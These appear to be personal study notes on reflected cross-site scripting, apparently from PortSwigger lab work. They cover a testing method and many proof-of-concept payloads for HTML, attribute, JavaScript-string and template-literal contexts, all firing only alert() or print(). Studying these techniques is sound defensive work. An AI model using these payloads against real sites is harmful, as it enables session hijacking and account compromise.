z?
==
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way

way to find reflected xss
==
:>test every entry point
:>submit random values
:>determine the reflection context 
:>test candidate payload 
:> test alternative payloads incase first one was blocked
:>test attack in browser


->> limitations
- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.


poc 
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>

findings
=

1. some reflected xss vuln require enumarating through tags and events then using iframe payloads with accepted tags and events e.g
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>

note# during enumarating add the space in url encode body%30<event>


2. when using custom tags makes sure you exhaust all possible event payloads available  with the xss cheat sheet then foscus on the once that require no user interaction to execute e.g <xss autofocus tabindex=1 onfocus=alert(1)></xss>
<xss autofocus tabindex=1 onfocusin=alert(1)></xss>

when using custom server like burpe may sure payload is in script tags <script></script>.






#XSS in HTML tag attributes
==
When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
"><script>alert(document.domain)</script>

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
" autofocus onfocus=alert(document.domain) x="


note#
===
most times using using payload that break out of the 
attribute and calling an event works here
<script>
e.g "xcv onmouseover="alert(1)
which then shows in the main code as value"xcv" onmouseover="alert(1)"

</script>

note#
==
 Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. For example:
<a href="javascript:alert(document.domain)">

xss canonical 
==
This technique now works in Chrome! It also works in link elements that means previously unexploitable XSS bugs in link elements where you only control attributes can be exploited using this technique. For example you might have a link element with a rel attribute on canonical, if you inject the accesskey attribute with an onclick event then you have XSS. 
<link rel="canonical" accesskey="X" onclick="alert(1)" />

Poc using link elements (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)

Visit our Web Security Academy to learn more about cross-site scripting (XSS)

note# use single qoutes to close values incase double doesent works e.g
<script>accesskey='x' onclick='alert(1)</script>


terminating exisiting javascript
====
 then you can use the following payload to break out of the existing JavaScript and execute your own:
</script><img src=1 onerror=alert(document.domain)>

#note sometimes ...backlashes and single qoutes can be escaped its left for the tester to find a way to undo such by closing a string with </script> before droping a payload

Breaking out of java script srings
====
sometimes the string has to be repaired after being broke out of for the payload to run 

 Some useful ways of breaking out of a string literal are: 
 < script>
'-alert(document.domain)-'
';alert(document.domain)//


This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.

For example, suppose that the input:
';alert(document.domain)//

gets converted to:
\';alert(document.domain)//

You can now use the alternative payload:
\';alert(document.domain)//

which gets converted to:
\\';alert(document.domain)//

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.>>>

</script>

making use of html encoding
===


 For example, if the XSS context is as follows:
<a href="#" onclick="... var input='controllable data here'; ...">

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
<d>
&apos;-alert(document.domain)-&apos;
</d>

note#
somtimes you can join it to the normal attribute value like this
<d>
https://test.com&apos;-alert(1)-&apos;
</d>


XSS in JavaScript template literals
===

 For example, the following script will print a welcome message that includes the user's display name:
 <d>
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
</d>
 then you can use the following payload to execute JavaScript without terminating the template literal:
 <d>
${alert(document.domain)}
</d>